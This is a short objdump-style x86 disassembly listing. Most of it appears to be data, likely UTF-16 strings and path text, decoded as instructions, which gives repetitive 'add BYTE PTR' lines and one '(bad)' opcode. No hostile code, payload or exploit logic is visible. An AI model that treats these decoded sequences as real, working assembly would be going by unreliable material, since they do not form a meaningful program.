  433a40:	add    BYTE PTR ds:0x47005f00,dh
  433a46:	add    BYTE PTR ds:0x48000000,dh
  433a4c:	add    BYTE PTR [edx+0x0],cl
  433a4f:	push   eax
  433a50:	add    BYTE PTR [edi+0x0],bl
  433a53:	cmp    BYTE PTR [eax],al
  433a55:	add    BYTE PTR ss:0x55004100,dh
  433a5c:	add    BYTE PTR [edi+0x0],bl
  433a5f:	push   edx
  433a60:	add    BYTE PTR [edi],dh
  433a62:	add    BYTE PTR [ecx+0x0],cl
  433a65:	add    BYTE PTR [eax],al
  433a67:	inc    esp
  433a68:	add    BYTE PTR [ecx+0x0],dl
  433a6b:	inc    edx
  433a6c:	add    BYTE PTR [edi+0x0],bl
  433a6f:	push   ecx
  433a70:	add    BYTE PTR [ecx+0x0],bl
  433a73:	dec    edi
  433a74:	add    BYTE PTR [eax+0x0],dl
  433a77:	add    BYTE PTR [eax],al
  433a79:	dec    edx
  433a7a:	add    BYTE PTR [ecx+0x0],dl
  433a7d:	inc    esp
  433a7e:	add    BYTE PTR [edi+0x0],bl
  433a81:	dec    edx
  433a82:	add    BYTE PTR [eax],dh
  433a84:	add    BYTE PTR [ecx],dh
  433a86:	add    BYTE PTR [ebx+0x0],dl
  433a89:	push   ecx
  433a8a:	add    BYTE PTR [ecx],dh
  433a8c:	add    BYTE PTR [edi+0x0],bl
  433a8f:	push   edi
  433a90:	add    BYTE PTR [eax],al
  433a92:	add    BYTE PTR [ebx+0x0],cl
  433a95:	pop    edx
  433a96:	add    BYTE PTR [esi],dh
  433a98:	add    BYTE PTR [edi+0x0],bl
  433a9b:	inc    ebx
  433a9c:	add    BYTE PTR [eax+eax*1+0x5a],dl
  433aa0:	add    BYTE PTR [edi+0x0],bl
  433aa3:	push   edi
  433aa4:	add    BYTE PTR [ebx],dh
  433aa6:	add    BYTE PTR [esi+0x0],cl
  433aa9:	push   ebp
  433aaa:	add    BYTE PTR [edi+0x0],bl
  433aad:	dec    edx
  433aae:	add    BYTE PTR [eax],al
  433ab0:	add    BYTE PTR [edi+0x0],dl
  433ab3:	aaa    
  433ab4:	add    BYTE PTR [eax],bh
  433ab6:	add    BYTE PTR [edi+0x0],bl
  433ab9:	pop    eax
  433aba:	add    BYTE PTR [edi+0x0],cl
  433abd:	inc    edi
  433abe:	add    BYTE PTR [edi+0x0],bl
  433ac1:	xor    al,0x0
  433ac3:	push   eax
  433ac4:	add    BYTE PTR [ecx+0x0],cl
  433ac7:	push   ebp
  433ac8:	add    BYTE PTR [eax],al
  433aca:	add    BYTE PTR [edi+0x0],dl
  433acd:	push   esp
  433ace:	add    BYTE PTR [ebx+0x0],cl
  433ad1:	add    BYTE PTR [eax],al
  433ad3:	add    BYTE PTR [edx+0x53],dl
  433ad6:	inc    esp
  433ad7:	push   ebx
  433ad8:	mov    dl,0x94
  433ada:	in     al,0x7a
  433adc:	pmuludq mm5,QWORD PTR [ebp+0x47]
  433ae0:	(bad)  
  433ae1:	idiv   DWORD PTR [eax+0x1630f137]
  433ae7:	js     0x433b04
  433ae9:	add    BYTE PTR [eax],al
  433aeb:	add    BYTE PTR [edx+edi*1+0x5c],dl
  433aef:	jns    0x433b5a
  433af1:	addr16 push edi
  433af3:	bound  bx,DWORD PTR [edx+0x45]
  433af7:	outs   dx,BYTE PTR ds:[esi]
  433af8:	pop    esp
  433af9:	je     0x433b6e
  433afb:	ja     0x433b3e
  433afd:	imul   edx,DWORD PTR [ecx+esi*2+0x4d],0x63455c61
  433b05:	js     0x433b76
  433b07:	jp     0x433b78
  433b09:	jns    0x433b6f
  433b0b:	jp     0x433b75
  433b0d:	je     0x433b73
  433b0f:	jp     0x433b73
  433b11:	cs jo  0x433b78
  433b14:	bound  eax,QWORD PTR [eax]
	...
